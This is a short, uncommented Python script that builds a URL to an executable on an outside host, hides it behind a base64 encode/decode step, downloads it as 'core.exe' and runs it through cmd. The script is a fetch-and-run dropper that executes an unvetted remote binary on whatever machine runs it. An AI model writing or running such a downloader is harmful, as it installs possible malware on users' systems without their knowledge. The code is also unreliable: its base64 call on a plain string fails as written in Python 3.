import os
import base64
import time
import sys
protocol = "https://"
downloadurl = base64.b64encode(protocol + "freeviewer.alwaysdata.net/other/GoofyBrowser.exe")
downloadurl1 = base64.b64decode(downloadurl)
import urllib.request
import urllib
url = downloadurl1

filename = "core.exe"

urllib.request.urlretrieve(url, filename)
os.system("cmd /c core.exe")
